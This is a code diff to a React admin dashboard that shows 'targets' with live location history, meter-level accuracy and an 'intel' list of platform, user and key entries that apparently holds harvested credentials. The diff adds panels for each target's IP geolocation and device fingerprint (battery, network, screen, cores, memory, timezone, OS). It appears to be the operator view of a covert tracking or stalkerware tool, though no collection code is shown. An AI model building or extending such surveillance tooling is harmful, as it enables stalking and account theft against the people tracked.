@@ -15,6 +15,17 @@ interface TargetData {
   platform?: string;
   history?: { lat: number, lng: number, time: string }[];
   intel?: { platform: string, user: string, key: string, timestamp: string }[];
+  ipInfo?: { ip: string, city: string, region: string, country: string, org: string };
+  deviceInfo?: {
+    battery?: string;
+    network?: { type: string, downlink: number, rtt: number };
+    screen?: string;
+    userAgent?: string;
+    timezone?: string;
+    platform?: string;
+    cores?: number | string;
+    memory?: number | string;
+  };
 }
 
 // --- Subcomponents ---
@@ -122,6 +133,60 @@ const TelemetryBlock = ({ target, historyIndex }: any) => {
             <span className="text-[11px] font-mono font-bold text-blue-400">±{target.accuracy?.toFixed(1) || '0.0'} METERS</span>
          </div>
       </div>
+
+       {target.ipInfo && (
+          <div className="bg-blue-600/5 p-4 rounded-xl border border-blue-500/20 space-y-3">
+             <div className="flex items-center gap-2 mb-2">
+                <Globe className="w-3 h-3 text-blue-500" />
+                <span className="text-[9px] font-black uppercase tracking-widest text-blue-400">Digital Footprint (IP)</span>
+             </div>
+             <div className="grid grid-cols-2 gap-y-3 gap-x-4">
+                <div className="space-y-1">
+                   <span className="text-[7px] text-slate-600 uppercase font-black">Address</span>
+                   <span className="text-[10px] block font-mono text-white truncate font-bold">{target.ipInfo.ip}</span>
+                </div>
+                <div className="space-y-1">
+                   <span className="text-[7px] text-slate-600 uppercase font-black">Location</span>
+                   <span className="text-[10px] block font-bold text-white truncate">{target.ipInfo.city}, {target.ipInfo.country}</span>
+                </div>
+                <div className="space-y-1 col-span-2">
+                   <span className="text-[7px] text-slate-600 uppercase font-black">Provider</span>
+                   <span className="text-[10px] block font-bold text-slate-400 truncate">{target.ipInfo.org}</span>
+                </div>
+             </div>
+          </div>
+       )}
+
+       {target.deviceInfo && (
+          <div className="bg-slate-900/40 p-4 rounded-xl border border-slate-800 space-y-3">
+             <div className="flex items-center gap-2 mb-2">
+                <Settings className="w-3 h-3 text-slate-500" />
+                <span className="text-[9px] font-black uppercase tracking-widest text-slate-500">Hardware Profile</span>
+             </div>
+             <div className="grid grid-cols-2 gap-y-3 gap-x-4">
+                <div className="space-y-1">
+                   <span className="text-[7px] text-slate-600 uppercase font-black">Power</span>
+                   <span className="text-[10px] block font-bold text-white">{target.deviceInfo.battery || 'Unknown'}</span>
+                </div>
+                <div className="space-y-1">
+                   <span className="text-[7px] text-slate-600 uppercase font-black">Ratio</span>
+                   <span className="text-[10px] block font-bold text-white">{target.deviceInfo.screen || 'N/A'}</span>
+                </div>
+                <div className="space-y-1">
+                   <span className="text-[7px] text-slate-600 uppercase font-black">Network</span>
+                   <span className="text-[10px] block font-bold text-blue-400 uppercase">{target.deviceInfo.network?.type || 'Standard'} {target.deviceInfo.network?.downlink ? `(${target.deviceInfo.network.downlink}mbps)` : ''}</span>
+                </div>
+                <div className="space-y-1">
+                  <span className="text-[7px] text-slate-600 uppercase font-black">Cores/Mem</span>
+                  <span className="text-[10px] block font-bold text-white">{target.deviceInfo.cores || '?'}/{target.deviceInfo.memory || '?'}G</span>
+                </div>
+             </div>
+             <div className="pt-2 border-t border-slate-800/50">
+               <span className="text-[7px] text-slate-600 uppercase font-black block mb-1">Timezone / OS</span>
+               <span className="text-[9px] text-slate-400 font-mono truncate block">{target.deviceInfo.timezone} / {target.deviceInfo.platform}</span>
+             </div>
+          </div>
+       )}
     </div>
   );
 };
@@ -339,7 +404,9 @@ export const AdminDashboard: React.FC = () => {
           status: data.status || 'offline',
           platform: data.platform,
           history: data.history,
-          intel: data.intel
+          intel: data.intel,
+          ipInfo: data.ipInfo,
+          deviceInfo: data.deviceInfo
         });
       });
       
